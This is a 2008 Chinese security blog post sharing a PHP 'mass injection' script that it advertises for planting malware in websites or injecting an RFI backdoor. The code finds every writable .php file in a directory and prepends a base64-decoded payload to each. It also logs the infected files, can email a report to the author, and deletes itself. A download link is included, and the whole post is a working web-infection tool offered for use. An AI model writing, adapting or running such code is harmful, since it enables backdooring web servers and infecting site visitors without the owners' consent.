---
title: PHP批量挂马脚本
description: 来源：红狼作者：f3v3r批量写入档案脚本...可以拿来挂马也能拿来当RFI的后门注入code都写明的，有需要的请自己看后门写在$inj里面，要做base64encode的Polymorphic不希望这个东西被搞破坏的人拿去玩懂原理的就自个儿收下吧
date: 2008-03-04 10:16:02
category: 安全工具
tags: ['脚本Script', 'PHP', '源码']
post_id: 391
alias: PHP-piliang-guama-jiaoben
ViewNums: 11207
---
## [PHP](/tags/PHP)批量挂马脚本

来源：红狼
作者：f3v3r

批量写入档案脚本...
可以拿来挂马
也能拿来当RFI的后门[注入](/tags/%E6%B3%A8%E5%85%A5)
code都写明的，有需要的请自己看
[后门](/tags/%E5%90%8E%E9%97%A8)写在$inj里面，要做base64 encode的Polymorphic
不希望这个东西被搞破坏的人拿去玩
懂原理的就自个儿收下吧
```php
<?php
set_time_limit(0);
ignore_user_abort(1);
# PHP Mass Injection Script by f3v3r ver.228
# |1| Look for PHP in directory.|2| Check injected.
# |3| Inject script. |4|Can email report to you.
$inj ='';
$log_email = 0;//change 1 enable, somehow they can trace you by this way.
$email = 'f3v3r@cc.cc';
$log_report = 1;
$filename = '__log.html';
$delete_me = 1;

echo '<title>f3v3r injection toolz</title><center><strong>Defacez aint hack, r00tz r.</strong></center><br>';
$dir = opendir('.');
$site=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST);
while ($file = readdir($dir))
{
if (strstr($file, '.php') && is_writeable($file))
{
$victim = fopen($file, 'r+');
$victim_read = fread($victim, filesize($file));
if (!strstr($victim_read, 'f3v3r'))
{
fclose($victim);
unlink($file);
$new = fopen($file, 'a+');
$new_write = fwrite($new, base64_decode($inj) . $victim_read);
fclose($new);
echo '<strong>[-] injecting : ' . $site . '</strong><br>';
echo '[x] injected: ' . $file . '<br>';
if($log_email) { $log = fopen('__tmp', 'a+'); fwrite($log, '[x] File: ' . getcwd() . $file . '<br>'); fclose($log); }
if($log_report) { $x = fopen($filename, 'a+'); fwrite($x, '[x] File: ' . getcwd() . $file . '
'); fclose($x); }
}
}
}
closedir($dir);
if($log_email) { $report = file_get_contents('__tmp'); mail($email, "injection report", '<br>f3v3r<br> ' .$report, 'From: f3v3r <f3v3r@cc.cc>'); unlink('__tmp'); echo '[x] Email Report Sent!';}
if($delete_me) { unlink(__file__); }
exit;
?>
```
MD5 checksum:DE734BDAC73E6ECE8DD3DB40416976E8
#f3v3r

下载：[injection.rar](/blog/download.asp?id=55 (1.52 KB)

